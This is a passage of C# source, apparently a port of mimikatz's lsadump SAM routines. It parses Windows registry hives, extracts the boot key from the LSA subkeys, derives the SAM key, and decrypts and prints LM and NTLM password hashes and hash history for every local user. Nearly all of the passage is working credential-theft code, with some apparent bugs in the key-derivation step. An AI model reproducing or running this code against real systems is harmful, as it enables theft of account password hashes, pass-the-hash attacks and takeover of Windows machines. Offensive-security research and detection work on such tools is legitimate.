                pKn = (KULL_M_REGISTRY_HIVE_KEY_NAMED)Marshal.PtrToStructure(hKey, typeof(KULL_M_REGISTRY_HIVE_KEY_NAMED));

            if (pKn.tag == 27502)
            {
                if (pKn.nbValues != 0 && pKn.offsetValues != -1)
                {
                    KULL_M_REGISTRY_HIVE_VALUE_LIST pVl = (KULL_M_REGISTRY_HIVE_VALUE_LIST)Marshal.PtrToStructure(IntPtr.Add(registryHive.pStartOf, pKn.offsetValues), typeof(KULL_M_REGISTRY_HIVE_VALUE_LIST));
                    pVl.offsetValue = UpdateDataInt(IntPtr.Add(registryHive.pStartOf, pKn.offsetValues), Utils.FieldOffset<KULL_M_REGISTRY_HIVE_VALUE_LIST>("offsetValue"), (int)pKn.nbValues);
                    for (int i = 0; i < pKn.nbValues; i++)
                    {
                        KULL_M_REGISTRY_HIVE_VALUE_KEY pVk = new KULL_M_REGISTRY_HIVE_VALUE_KEY();
                        IntPtr cp = IntPtr.Add(registryHive.pStartOf, pVl.offsetValue[i]);
                        pVk = (KULL_M_REGISTRY_HIVE_VALUE_KEY)Marshal.PtrToStructure(cp, typeof(KULL_M_REGISTRY_HIVE_VALUE_KEY));
                        pVk.valueName = UpdateDataBytes(cp, Utils.FieldOffset<KULL_M_REGISTRY_HIVE_VALUE_KEY>("valueName"), pVk.szValueName);
                        if (pVk.tag == 27510)
                        {
                            if (pVk.szValueName != 0)
                            {
                                string name = Encoding.UTF8.GetString(pVk.valueName);
                                if (name.Equals(lpValueName))
                                    return cp;

                            }
                        }
                    }
                }
            }

            return IntPtr.Zero;
        }


        private static KULL_M_REGISTRY_HIVE_BIN_CELL_DATA GetBinCell(IntPtr pRegistryHive, int offset, int size)
        {
            KULL_M_REGISTRY_HIVE_HANDLE registryHive = (KULL_M_REGISTRY_HIVE_HANDLE)Marshal.PtrToStructure(pRegistryHive, typeof(KULL_M_REGISTRY_HIVE_HANDLE));
            KULL_M_REGISTRY_HIVE_BIN_CELL_DATA c = (KULL_M_REGISTRY_HIVE_BIN_CELL_DATA)Marshal.PtrToStructure(IntPtr.Add(registryHive.pStartOf, offset), typeof(KULL_M_REGISTRY_HIVE_BIN_CELL_DATA));
            c.data = UpdateDataBytes(IntPtr.Add(registryHive.pStartOf, offset), Utils.FieldOffset<KULL_M_REGISTRY_HIVE_BIN_CELL_DATA>("data"), size);
            return c;
        }

        private static bool RegQueryValueEx(IntPtr hRegistry, IntPtr hKey, string lpValueName, IntPtr lpReserved, ref uint lpType, ref IntPtr lpData, ref uint lpcbData)
        {
            KULL_M_REGISTRY_HANDLE registry = new KULL_M_REGISTRY_HANDLE();
            registry = (KULL_M_REGISTRY_HANDLE)Marshal.PtrToStructure(hRegistry, typeof(KULL_M_REGISTRY_HANDLE));
            switch (registry.type)
            {
                case KULL_M_REGISTRY_TYPE.KULL_M_REGISTRY_TYPE_OWN:
                    NTSTATUS dwErrCode = (NTSTATUS)Native.RegQueryValueEx(hKey, lpValueName, lpReserved, ref lpType, lpData, ref lpcbData);
                    if (dwErrCode == NTSTATUS.Success)
                        return true;
                    break;
                case KULL_M_REGISTRY_TYPE.KULL_M_REGISTRY_TYPE_HIVE:
                    IntPtr pFvk = SearchValueNameInList(hRegistry, hKey, lpValueName);

                    if (pFvk != IntPtr.Zero)
                    {
                        KULL_M_REGISTRY_HIVE_VALUE_KEY vk = (KULL_M_REGISTRY_HIVE_VALUE_KEY)Marshal.PtrToStructure(pFvk, typeof(KULL_M_REGISTRY_HIVE_VALUE_KEY));
                        uint szData = vk.szData & ~0x80000000;
                        if (lpType != 0)
                            lpType = vk.typeData;

                        if (lpData != IntPtr.Zero)
                        {
                            if (lpcbData >= szData)
                            {
                                if ((vk.szData & 0x80000000) != 0)
                                {
                                    byte[] dest = new byte[szData];
                                    lpcbData = szData;
                                    Marshal.WriteInt32(lpData, vk.offsetData);
                                    return true;
                                }
                                else
                                {
                                    lpcbData = szData;
                                    GCHandle pinnedArray = GCHandle.Alloc(GetBinCell(registry.pHandleHive, vk.offsetData, (int)szData).data, GCHandleType.Pinned);
                                    lpData = pinnedArray.AddrOfPinnedObject();
                                    return true;
                                }
                            }
                        }
                        lpcbData = szData;
                        return true;
                    }
                    break;
                default:
                    break;
            }
            return false; ;
        }

        private static void RegCloseKey(IntPtr hRegistry, IntPtr hKey)
        {
            KULL_M_REGISTRY_HANDLE registry = new KULL_M_REGISTRY_HANDLE();
            registry = (KULL_M_REGISTRY_HANDLE)Marshal.PtrToStructure(hRegistry, typeof(KULL_M_REGISTRY_HANDLE));

            switch (registry.type)
            {
                case KULL_M_REGISTRY_TYPE.KULL_M_REGISTRY_TYPE_OWN:
                    Native.RegCloseKey(hKey);
                    break;
                case KULL_M_REGISTRY_TYPE.KULL_M_REGISTRY_TYPE_HIVE:
                    break;
                default:
                    break;
            }
        }

        private static bool OpenAndQueryWithAlloc(IntPtr hRegistry, IntPtr hKey, string lpSubKey, string lpValueName, ref uint lpType, ref IntPtr lpData, out uint szNeeded)
        {
            IntPtr hResult = RegOpenKeyEx(hRegistry, hKey, lpSubKey, 0, (Native.ACCESS_MASK)KEY_READ);
            szNeeded = 0;
            if (hResult != IntPtr.Zero)
            {
                bool status = QueryWithAlloc(hRegistry, hResult, lpValueName, ref lpType, ref lpData, ref szNeeded);
                RegCloseKey(hRegistry, hResult);
                return status;
            }
            else Console.WriteLine("RegOpenKeyEx KO");
            return false;
        }

        private static byte[] ConvertAnsiToUnicode(byte[] ansi)
        {
            string tmp = Encoding.ASCII.GetString(ansi);
            return Encoding.Unicode.GetBytes(tmp);
        }


        private static bool RegEnumKeyEx(IntPtr hRegistry, IntPtr hKey, uint dwIndex, IntPtr lpName, IntPtr lpcName, IntPtr lpReserved, IntPtr lpClass, IntPtr lpcClass, IntPtr lpftLastWriteTime)
        {
            bool status = false;
            NTSTATUS dwErrCode;
            uint szInCar;
            KULL_M_REGISTRY_HIVE_KEY_NAMED pKn = new KULL_M_REGISTRY_HIVE_KEY_NAMED();
            KULL_M_REGISTRY_HIVE_KEY_NAMED pCandidateKn = new KULL_M_REGISTRY_HIVE_KEY_NAMED();
            KULL_M_REGISTRY_HIVE_BIN_CELL_TAG pHbC = new KULL_M_REGISTRY_HIVE_BIN_CELL_TAG();
            KULL_M_REGISTRY_HIVE_LF_LH pLfLh = new KULL_M_REGISTRY_HIVE_LF_LH();

            KULL_M_REGISTRY_HANDLE registry = new KULL_M_REGISTRY_HANDLE();
            KULL_M_REGISTRY_HIVE_HANDLE registryHive = new KULL_M_REGISTRY_HIVE_HANDLE();
            registry = (KULL_M_REGISTRY_HANDLE)Marshal.PtrToStructure(hRegistry, typeof(KULL_M_REGISTRY_HANDLE));

            switch (registry.type)
            {
                case KULL_M_REGISTRY_TYPE.KULL_M_REGISTRY_TYPE_OWN:
                    dwErrCode = (NTSTATUS)RegEnumKeyExW(hKey, dwIndex, lpName, lpcName, lpReserved, lpClass, lpcClass, lpftLastWriteTime);
                    if (dwErrCode != NTSTATUS.Success)
                        status = false;
                    break;
                case KULL_M_REGISTRY_TYPE.KULL_M_REGISTRY_TYPE_HIVE:
                    pKn = (KULL_M_REGISTRY_HIVE_KEY_NAMED)Marshal.PtrToStructure(hKey, typeof(KULL_M_REGISTRY_HIVE_KEY_NAMED));

                    if (pKn.nbSubKeys > 0 && (dwIndex < pKn.nbSubKeys) && (pKn.offsetSubKeys != -1))
                    {
                        registryHive = (KULL_M_REGISTRY_HIVE_HANDLE)Marshal.PtrToStructure(registry.pHandleHive, typeof(KULL_M_REGISTRY_HIVE_HANDLE));
                        pHbC = (KULL_M_REGISTRY_HIVE_BIN_CELL_TAG)Marshal.PtrToStructure(IntPtr.Add(registryHive.pStartOf, pKn.offsetSubKeys), typeof(KULL_M_REGISTRY_HIVE_BIN_CELL_TAG));

                        switch (pHbC.tag)
                        {
                            case 26220:
                            case 26732:
                                pLfLh = (KULL_M_REGISTRY_HIVE_LF_LH)Marshal.PtrToStructure(IntPtr.Add(registryHive.pStartOf, pKn.offsetSubKeys), typeof(KULL_M_REGISTRY_HIVE_LF_LH));
                                pLfLh.elements = UpdateDataREGISTRY_HIVE_LF_LH_ELEMENT(IntPtr.Add(registryHive.pStartOf, pKn.offsetSubKeys), Utils.FieldOffset<KULL_M_REGISTRY_HIVE_LF_LH>("elements"), pLfLh.nbElements);
                                if (pLfLh.nbElements > 0 && (dwIndex < pLfLh.nbElements))
                                {

                                    pCandidateKn = (KULL_M_REGISTRY_HIVE_KEY_NAMED)Marshal.PtrToStructure(IntPtr.Add(registryHive.pStartOf, pLfLh.elements[dwIndex].offsetNamedKey), typeof(KULL_M_REGISTRY_HIVE_KEY_NAMED));

                                    pCandidateKn.keyName = UpdateDataBytes(IntPtr.Add(registryHive.pStartOf, pLfLh.elements[dwIndex].offsetNamedKey), Utils.FieldOffset<KULL_M_REGISTRY_HIVE_KEY_NAMED>("keyName"), pCandidateKn.szKeyName);

                                    if ((pCandidateKn.tag == 27502) && lpName != IntPtr.Zero && lpcName != IntPtr.Zero)
                                    {
                                        //if (lpftLastWriteTime != IntPtr.Zero)
                                        //TODO *lpftLastWriteTime = pKn.lastModification;

                                        if ((pCandidateKn.flags & KULL_M_REGISTRY_HIVE_KEY_NAMED_FLAG_ASCII_NAME) != 0)
                                        {
                                            szInCar = pCandidateKn.szKeyName;
                                            if (status = (Marshal.ReadInt32(lpcName) > szInCar))
                                            {
                                                byte[] buffer = ConvertAnsiToUnicode(pCandidateKn.keyName);
                                                Marshal.Copy(buffer, 0, lpName, (int)szInCar * 2);
                                            }
                                            if (status)
                                                Marshal.WriteByte(IntPtr.Add(lpName, ((int)szInCar * 2) + 1), 0x00);
                                        }
                                        else
                                        {
                                            szInCar = (uint)pCandidateKn.szKeyName / 2;
                                            if (status = (Marshal.ReadInt32(lpcName) > szInCar))
                                            {
                                                Marshal.Copy(pCandidateKn.keyName, 0, lpName, (int)pKn.szKeyName);
                                            }
                                            if (status)
                                                Marshal.WriteByte(IntPtr.Add(lpName, pKn.szKeyName + 1), 0x00);
                                        }

                                        Marshal.WriteInt32(lpcName, (int)szInCar);

                                        if (lpcClass != IntPtr.Zero)
                                        {
                                            szInCar = (uint)pCandidateKn.szClassName / 2;
                                            if (lpClass != IntPtr.Zero)
                                            {
                                                if (status = (Marshal.ReadInt32(lpcClass) > szInCar))
                                                {
                                                    Marshal.Copy(GetBinCell(registryHive.pStartOf, pCandidateKn.offsetClassName, pCandidateKn.szClassName).data, 0, lpClass, pCandidateKn.szClassName);
                                                    Marshal.WriteByte(IntPtr.Add(lpName, pCandidateKn.szClassName + 1), 0x00);
                                                }
                                            }
                                            Marshal.WriteInt32(lpcClass, (int)szInCar);
                                        }
                                    }
                                }
                                break;
                            case 26988:
                            case 26994:
                            default:
                                break;
                        }
                    }
                    break;
                default:
                    break;
            }
            return status;
        }

        private static bool GetHash(IntPtr pSamHash, IntPtr pStartOfData, IntPtr samKey, uint rid, bool isNtlm, bool isHistory)
        {
            bool status = false;
            SAM_HASH_AES pHashAes = new SAM_HASH_AES();
            CRYPTO_BUFFER cypheredHashBuffer = new CRYPTO_BUFFER();
            IntPtr output = IntPtr.Zero;
            uint len = 0;
            SAM_ENTRY samentry = new SAM_ENTRY();
            samentry = (SAM_ENTRY)Marshal.PtrToStructure(pSamHash, typeof(SAM_ENTRY));

            SAM_HASH pHash = (SAM_HASH)Marshal.PtrToStructure(IntPtr.Add(pStartOfData, (int)samentry.offset), typeof(SAM_HASH));
            pHash.data = UpdateDataBytes(IntPtr.Add(pStartOfData, (int)samentry.offset), Utils.FieldOffset<SAM_HASH>("data"), (int)samentry.lenght - Utils.FieldOffset<SAM_HASH>("data"));

            if (samentry.offset > 0 && samentry.lenght > 0)
            {
                switch (pHash.Revision)
                {
                    case 1:
                        if (samentry.lenght >= Marshal.SizeOf(typeof(SAM_HASH)))
                        {
                            int lenght = isNtlm ? (isHistory ? lsadump_NTPASSWORDHISTORY.Length : lsadump_NTPASSWORD.Length) : (isHistory ? lsadump_LMPASSWORDHISTORY.Length : lsadump_LMPASSWORD.Length);
                            byte[] src = new byte[SAM_KEY_DATA_KEY_LENGTH + sizeof(uint) + lenght + lsadump_01234567890123.Length];
                            byte[] samkeyb = new byte[SAM_KEY_DATA_KEY_LENGTH];
                            Marshal.Copy(samKey, samkeyb, 0, SYSKEY_LENGTH);
                            string mystring = isNtlm ? (isHistory ? lsadump_NTPASSWORDHISTORY : lsadump_NTPASSWORD) : (isHistory ? lsadump_LMPASSWORDHISTORY : lsadump_LMPASSWORD);
                            byte[] ridb = BitConverter.GetBytes(rid);
                            Array.Reverse(ridb);
                            src = samkeyb.Concat(ridb).Concat(Encoding.Default.GetBytes(mystring)).ToArray();

                            MD5 md5 = new MD5CryptoServiceProvider();
                            byte[] md5out = md5.ComputeHash(src);
                            GCHandle pinnedArrayMd5 = GCHandle.Alloc(md5out, GCHandleType.Pinned);
                            IntPtr pmd5 = pinnedArrayMd5.AddrOfPinnedObject();

                            CRYPTO_BUFFER keyBuffer = new CRYPTO_BUFFER();
                            keyBuffer.Length = MD5_DIGEST_LENGTH;
                            keyBuffer.MaximumLength = MD5_DIGEST_LENGTH;
                            keyBuffer.Buffer = pmd5;

                            Marshal.Copy(pHash.data, 0, samKey, (int)SAM_KEY_DATA_KEY_LENGTH);

                            cypheredHashBuffer.Length = 0;
                            cypheredHashBuffer.MaximumLength = 0;
                            cypheredHashBuffer.Buffer = IntPtr.Zero;

                            cypheredHashBuffer.Length = cypheredHashBuffer.MaximumLength = samentry.lenght - (uint)Utils.FieldOffset<SAM_HASH>("data");
                            cypheredHashBuffer.Buffer = Marshal.AllocHGlobal((int)cypheredHashBuffer.Length);
                            if (cypheredHashBuffer.Buffer != IntPtr.Zero)
                            {
                                Marshal.Copy(pHash.data, 0, cypheredHashBuffer.Buffer, (int)cypheredHashBuffer.Length);
                                if (!(status = ((NTSTATUS)Native.RtlEncryptDecryptRC4(ref cypheredHashBuffer, ref keyBuffer) == NTSTATUS.Success)))
                                    Console.WriteLine("RtlDecryptData2");
                            }
                        }
                        break;
                    case 2:
                        pHashAes = (SAM_HASH_AES)Marshal.PtrToStructure(IntPtr.Add(pStartOfData, (int)samentry.offset), typeof(SAM_HASH_AES));
                        pHashAes.data = UpdateDataBytes(IntPtr.Add(pStartOfData, (int)samentry.offset), Utils.FieldOffset<SAM_HASH_AES>("data"), (int)samentry.lenght - Utils.FieldOffset<SAM_HASH_AES>("data"));
                        if (pHashAes.dataOffset >= SAM_KEY_DATA_SALT_LENGTH)
                        {
                            GCHandle pinnedArray1 = GCHandle.Alloc(pHashAes.Salt, GCHandleType.Pinned);
                            IntPtr psalt = pinnedArray1.AddrOfPinnedObject();

                            GCHandle pinnedArray2 = GCHandle.Alloc(pHashAes.data, GCHandleType.Pinned);
                            IntPtr pdata = pinnedArray2.AddrOfPinnedObject();

                            byte[] btm = new byte[16];
                            Marshal.Copy(samKey, btm, 0, 16);

                            if (Crypto.AES.kull_m_crypto_genericAES128Decrypt(samKey, psalt, IntPtr.Add(pStartOfData, (int)samentry.offset + Utils.FieldOffset<SAM_HASH_AES>("data")), samentry.lenght - (uint)Utils.FieldOffset<SAM_HASH_AES>("data"), ref output, ref len))
                            {
                                cypheredHashBuffer.Length = cypheredHashBuffer.MaximumLength = len;
                                cypheredHashBuffer.Buffer = Marshal.AllocHGlobal((int)cypheredHashBuffer.Length);
                                if (cypheredHashBuffer.Buffer != IntPtr.Zero)
                                {
                                    byte[] buffer = new byte[len];
                                    Marshal.Copy(output, buffer, 0, (int)len);
                                    Marshal.Copy(buffer, 0, cypheredHashBuffer.Buffer, (int)len);
                                    status = true;
                                }
                            }
                        }
                        break;
                    default:
                        Console.WriteLine("Unknow SAM_HASH revision (%hu)\n", pHash.Revision);
                        break;
                }
                if (status)
                {
                    byte[] bx = new byte[cypheredHashBuffer.Length];
                    Marshal.Copy(cypheredHashBuffer.Buffer, bx, 0, bx.Length);
                }
                if (status)
                    DecryptHashWithRid(cypheredHashBuffer.Buffer, cypheredHashBuffer.Length, rid, isNtlm ? (isHistory ? "ntlm" : "NTLM") : (isHistory ? "lm  " : "LM  "), isHistory);
                if (cypheredHashBuffer.Buffer != IntPtr.Zero)
                    Marshal.FreeHGlobal(cypheredHashBuffer.Buffer);
            }
            return status;
        }

        private static bool DecryptHashWithRid(IntPtr encodedData, uint encodedDataSize, uint rid, string prefix, bool isHistory)
        {
            bool status = false;
            byte[] data = new byte[LM_NTLM_HASH_LENGTH];
            IntPtr pdata = Marshal.AllocHGlobal(16);
            byte[] gencdatab = new byte[encodedDataSize];
            Marshal.Copy(encodedData, gencdatab, 0, (int)encodedDataSize);
            for (int i = 0; i < encodedDataSize; i += LM_NTLM_HASH_LENGTH)
            {
                byte[] encdatab = Utils.GetBytes(gencdatab, i, LM_NTLM_HASH_LENGTH);
                status = ((NTSTATUS)RtlDecryptDES2blocks1DWORD(encdatab, ref rid, pdata) == NTSTATUS.Success);
                if (status)
                {
                    Marshal.Copy(pdata, data, 0, LM_NTLM_HASH_LENGTH);
                    if (isHistory)
                        Console.Write("[*]    {0}-{1}: ", prefix, i / LM_NTLM_HASH_LENGTH);
                    else
                        Console.Write("[!]  Hash {0}: ", prefix);
                    Console.WriteLine(Utils.PrintHashBytes(data));
                }
                else Console.Write("RtlDecryptNtOwfPwdWithIndex/RtlDecryptLmOwfPwdWithIndex");
            }
            return status;
        }


        private const uint HKEY_LOCALMACHINEE = 0x80000002;

        private static void GetLocalSamSID()
        {
            RegistryKey hhh = Registry.LocalMachine.OpenSubKey(@"SAM");
            if (hhh == null)
            {
                Console.WriteLine("[x] Error RegistryOpen SAM");
            }

            var Account = hhh.OpenSubKey(@"SAM\Domains\Account");

            var sid_test = (byte[])Account.GetValue(@"V");


            IntPtr unmanagedPointer = Marshal.AllocHGlobal(sid_test.Length);
            Marshal.Copy(sid_test, 0, unmanagedPointer, sid_test.Length);

            Console.Write("[*] Local SID : ");
            ConvertSidToStringSid(IntPtr.Add(unmanagedPointer, (int)(((byte[])sid_test).Length - (Marshal.SizeOf(typeof(SID)) + sizeof(uint) * 3))), out string sid_e);
            Console.WriteLine(sid_e);

            Marshal.FreeHGlobal(unmanagedPointer);
        }

        //The administrative user account in a domain.
        //private static int DOMAIN_USER_RID_ADMIN = 0x000001F4;
        //private static int DOMAIN_USER_RID_GUEST = 0x000001F5;
        public static void GetSamUsers(IntPtr pSamKey)
        {
            
            uint nbSubKeys, szMaxSubKeyLen, rid;
            USER_ACCOUNT_V UAv = new USER_ACCOUNT_V();
            IntPtr pData = IntPtr.Zero;
            GetLocalSamSID();

            RegistryKey hDataSam = Registry.LocalMachine.OpenSubKey(@"SAM");
            if (hDataSam == null)
            {
                Console.WriteLine("[x] Error RegistryOpen SAM");
                hDataSam.Close();
                return;
            }
            var Users = hDataSam.OpenSubKey(@"SAM\Domains\Account\Users");
            var registryUsers = Users.GetSubKeyNames();

            var keys = registryUsers.Where(val => val != "Names").ToArray();
            foreach (var key in keys)
            {
                var hUserKey = key;
                IntPtr pnbSubKeys = Marshal.AllocHGlobal(sizeof(uint));
                IntPtr pszMaxSubKeyLen = Marshal.AllocHGlobal(sizeof(uint));
                nbSubKeys = (uint)registryUsers.Length;
                szMaxSubKeyLen = (uint)registryUsers.Length;
                szMaxSubKeyLen++;
                IntPtr user = Marshal.AllocHGlobal((int)(szMaxSubKeyLen + 1) * 2);
                IntPtr hRegistry = IntPtr.Zero;
                    {
                        rid = Convert.ToUInt32(hUserKey, 16);
                        {
                            Console.WriteLine("[+] RID  : {0,8} ({1})", hUserKey, rid);
                            IntPtr pUAv = IntPtr.Zero;
                            byte[] szUserd = (byte[])Users.OpenSubKey(hUserKey).GetValue("V");
                            GCHandle pinnedArray = GCHandle.Alloc(szUserd, GCHandleType.Pinned);
                            pUAv = pinnedArray.AddrOfPinnedObject();
                            uint needed = (uint)szUserd.Length;


                            UAv = (USER_ACCOUNT_V)Marshal.PtrToStructure(pUAv, typeof(USER_ACCOUNT_V));
                            UAv.datas = UpdateDataBytes(pUAv, Utils.FieldOffset<USER_ACCOUNT_V>("datas"), (int)needed - (Utils.FieldOffset<USER_ACCOUNT_V>("datas")));
                            Console.WriteLine("[@] User : {0}", Encoding.Unicode.GetString(Utils.GetBytes(UAv.datas, UAv.Username.offset, (int)UAv.Username.lenght)));

                            GCHandle pinnedArrayDatas = GCHandle.Alloc(UAv.datas, GCHandleType.Pinned);
                            IntPtr pDatas = pinnedArrayDatas.AddrOfPinnedObject();

                            IntPtr pLMHash = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(SAM_ENTRY)));
                            IntPtr pNTLMHash = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(SAM_ENTRY)));
                            IntPtr pLMHistory = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(SAM_ENTRY)));
                            IntPtr pNTLMHistory = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(SAM_ENTRY)));

                            Marshal.StructureToPtr(UAv.LMHash, pLMHash, false);
                            Marshal.StructureToPtr(UAv.NTLMHash, pNTLMHash, false);
                            Marshal.StructureToPtr(UAv.LMHistory, pLMHistory, false);
                            Marshal.StructureToPtr(UAv.NTLMHistory, pNTLMHistory, false);

                            try
                            {
                                GetHash(pLMHash, IntPtr.Add(pUAv, Utils.FieldOffset<USER_ACCOUNT_V>("datas")), pSamKey, rid, false, false);
                                GetHash(pNTLMHash, IntPtr.Add(pUAv, Utils.FieldOffset<USER_ACCOUNT_V>("datas")), pSamKey, rid, true, false);
                                GetHash(pLMHistory, IntPtr.Add(pUAv, Utils.FieldOffset<USER_ACCOUNT_V>("datas")), pSamKey, rid, false, true);
                                GetHash(pNTLMHistory, IntPtr.Add(pUAv, Utils.FieldOffset<USER_ACCOUNT_V>("datas")), pSamKey, rid, true, true);
                            }
                            catch (Exception e)
                            {
                                if (Array.IndexOf(keys, key) == keys.Length - 1)
                                {
                                    Console.WriteLine("[$] Done!");
                                    break;
                                }   
                                Console.WriteLine(e.ToString());
                            }
                        }
                        Console.WriteLine("[*]");
                    }
            }
            hDataSam.Close();
        }
        public static object GetSamSalt()
        {
            RegistryKey kSam = Registry.LocalMachine.OpenSubKey(@"SAM\SAM\Domains\Account");
            if (kSam == null)
            {
                Console.WriteLine("Unable to get handle to Account registry");
                return null;
            }
            var o = kSam.GetValue("F");
            if (o != null)
            {
                return o;
            }
            return null;
        }

        private static byte[] UpdateDataBytes(IntPtr start, int fieldoffset, int count)
        {
            byte[] res = new byte[count];
            IntPtr p = IntPtr.Add(start, fieldoffset);
            Marshal.Copy(p, res, 0, count);
            return res;
        }

        public static byte[] PullBootKey()
        {
            byte[] bootKey = new byte[BootKeyLength];
            RegistryKey sys = Registry.LocalMachine.OpenSubKey(@"SYSTEM");

            if (sys != null)
            {
                using (var lsa = sys.OpenSubKey(@"CurrentControlSet\Control\Lsa\"))
                {
                    for (int i = 0; i < BootKeySubKeyNames.Length; i++)
                    {
                        using (var bootKeyPartKey = lsa.OpenSubKey(BootKeySubKeyNames[i]))
                        {
                            StringBuilder buffer = new StringBuilder(MaxRegistryKeyClassSize);
                            int bufferSize = buffer.Capacity;
                            int query = RegQueryInfoKey(bootKeyPartKey.Handle, buffer, ref bufferSize,
                                IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
                            if (query == 0)
                            {
                                string _bk = Convert.ToString(bootKeyPartKey.GetValue(ResolveBootSubKey(BootKeySubKeyNames[i])));
                                byte[] bootKeyPart = HexToBinary(buffer.ToString(), 0, buffer.ToString().Length);
                                Array.Copy(bootKeyPart, 0, bootKey, i * bootKeyPart.Length, bootKeyPart.Length);
                            }
                            else
                            {
                                Console.WriteLine("[*] Unable to query bootKey data for decoding.");
                                sys.Close();
                                return null;
                            }

                        }
                    }
                }
                sys.Close();
                return DecodeKey(bootKey);
            }
            else
            {
                Console.WriteLine("[*] regKey open SYSTEM failed /:");
                sys.Close();
                return null;
            }
        }

        public static byte[] HexToBinary(this string hex, int startIndex, int length)
        {

            if (length % 2 != 0)
            {
                var exception = new ArgumentException("[-] Value is not hex", nameof(hex));
                exception.Data.Add("Value", hex);
                throw exception;
            }

            if (startIndex < 0 || startIndex >= hex.Length)
            {
                throw new ArgumentOutOfRangeException(nameof(startIndex));
            }

            if (length < 0 || startIndex + length > hex.Length)
            {
                throw new ArgumentOutOfRangeException(nameof(length));
            }
            byte[] bytes = new byte[length / 2];
            for (int nibbleIndex = 0, byteIndex = 0; nibbleIndex < length; byteIndex = ++nibbleIndex / 2)
            {
                char nibble = hex[startIndex + nibbleIndex];
                if ('0' <= nibble && nibble <= '9')
                {
                    bytes[byteIndex] = (byte)((bytes[byteIndex] << 4) | (nibble - '0'));
                }
                else if ('a' <= nibble && nibble <= 'f')
                {
                    bytes[byteIndex] = (byte)((bytes[byteIndex] << 4) | (nibble - 'a' + 0xA));
                }
                else if ('A' <= nibble && nibble <= 'F')
                {
                    bytes[byteIndex] = (byte)((bytes[byteIndex] << 4) | (nibble - 'A' + 0xA));
                }
                else
                {
                    var exception = new ArgumentException("[-] Value is not hex", nameof(hex));
                    exception.Data.Add("Value", hex);
                    throw exception;
                }
            }
            return bytes;
        }

        private static string ResolveBootSubKey(string subkey)
        {
            if (subkey == "JD")
            {
                return JDValue;
            }
            if (subkey == "GBG")
            {
                return GBGValue;
            }
            if (subkey == "Data")
            {
                return DataValue;
            }
            if (subkey == "Skew1")
            {
                return Skew1Value;
            }
            return null;
        }



        private static byte[] DecodeKey(byte[] bootKey)
        {
            byte[] decodedBootKey = new byte[BootKeyLength];
            for (int i = 0; i < BootKeyLength; i++)
            {
                decodedBootKey[i] = bootKey[KeyPermutation[i]];
            }
            return decodedBootKey;
        }



        public static IntPtr RetSamKey(byte[] sysKey, byte[] samKey)
        {
            bool status = false;
            IntPtr pData = IntPtr.Zero;

            DOMAIN_ACCOUNT_F domAccF = new DOMAIN_ACCOUNT_F();
            SAM_KEY_DATA_AES AesKey = new SAM_KEY_DATA_AES();
            IntPtr output = IntPtr.Zero;
            uint len = 0;


            GCHandle pSysKey = GCHandle.Alloc(sysKey, GCHandleType.Pinned);
            IntPtr pointer = pSysKey.AddrOfPinnedObject();

            IntPtr unmanagedPointer = Marshal.AllocHGlobal(samKey.Length);
            Marshal.Copy(samKey, 0, unmanagedPointer, samKey.Length);

            Console.Write("[*] SAMKey : ");
            domAccF = (DOMAIN_ACCOUNT_F)Marshal.PtrToStructure(unmanagedPointer, typeof(DOMAIN_ACCOUNT_F)); //NOTE
            switch (domAccF.Revision)
            {
                case 2:
                case 3:
                    switch (domAccF.keys1.Revision)
                    {
                        case 1:
                            byte[] src = new byte[SAM_KEY_DATA_SALT_LENGTH + lsadump_qwertyuiopazxc.Length + SYSKEY_LENGTH + lsadump_01234567890123.Length];
                            byte[] syskeyb = new byte[SYSKEY_LENGTH];
                            Marshal.Copy((int[])sysKey.Select(x => (int)x).ToArray(), 0, unmanagedPointer, SYSKEY_LENGTH);
                            src = domAccF.keys1.Salt.Concat(Encoding.Default.GetBytes(lsadump_qwertyuiopazxc)).Concat(syskeyb).Concat(Encoding.Default.GetBytes(lsadump_qwertyuiopazxc)).ToArray();

                            MD5 md5 = new MD5CryptoServiceProvider();
                            byte[] md5out = md5.ComputeHash(src);
                            GCHandle pinnedArrayMd5 = GCHandle.Alloc(md5out, GCHandleType.Pinned);
                            IntPtr pmd5 = pinnedArrayMd5.AddrOfPinnedObject();

                            CRYPTO_BUFFER key = new CRYPTO_BUFFER();
                            key.Length = MD5_DIGEST_LENGTH;
                            key.MaximumLength = MD5_DIGEST_LENGTH;
                            key.Buffer = pmd5;

                            Marshal.Copy(domAccF.keys1.Key, 0, unmanagedPointer, (int)SAM_KEY_DATA_KEY_LENGTH);

                            CRYPTO_BUFFER data = new CRYPTO_BUFFER();
                            data.Length = SAM_KEY_DATA_KEY_LENGTH;
                            data.MaximumLength = SAM_KEY_DATA_KEY_LENGTH;
                            data.Buffer = unmanagedPointer;

                            if (!(status = ((NTSTATUS)RtlEncryptDecryptRC4(ref data, ref key) == NTSTATUS.Success)))
                                Console.WriteLine("RtlDecryptData2 KO");
                            break;
                        case 2:
                            IntPtr pAesKey = IntPtr.Add(unmanagedPointer, Utils.FieldOffset<DOMAIN_ACCOUNT_F>("keys1"));
                            AesKey = (SAM_KEY_DATA_AES)Marshal.PtrToStructure(pAesKey, typeof(SAM_KEY_DATA_AES));
                            AesKey.data = UpdateDataBytes(pAesKey, Utils.FieldOffset<SAM_KEY_DATA_AES>("data"), (int)AesKey.DataLen);

                            GCHandle pinnedArray1 = GCHandle.Alloc(AesKey.Salt, GCHandleType.Pinned);
                            IntPtr psalt = pinnedArray1.AddrOfPinnedObject();

                            GCHandle pinnedArray2 = GCHandle.Alloc(AesKey.data, GCHandleType.Pinned);
                            IntPtr pdata = pinnedArray2.AddrOfPinnedObject();

                            if (Crypto.AES.kull_m_crypto_genericAES128Decrypt(pointer, psalt, pdata, AesKey.DataLen, ref output, ref len))
                            {
                                if (status = (len == SAM_KEY_DATA_KEY_LENGTH))
                                {
                                    byte[] buffer = new byte[SAM_KEY_DATA_KEY_LENGTH];
                                    Marshal.Copy(output, buffer, 0, (int)SAM_KEY_DATA_KEY_LENGTH);
                                    Marshal.Copy(buffer, 0, unmanagedPointer, (int)SAM_KEY_DATA_KEY_LENGTH);
                                }
                            }
                            break;
                        default:
                            Console.WriteLine("Unknow Struct Key revision (%u)", domAccF.keys1.Revision);
                            break;
                    }
                    break;
                default:
                    Console.WriteLine("Unknow F revision (%hu)", domAccF.Revision);
                    break;
            }
            if (!status)
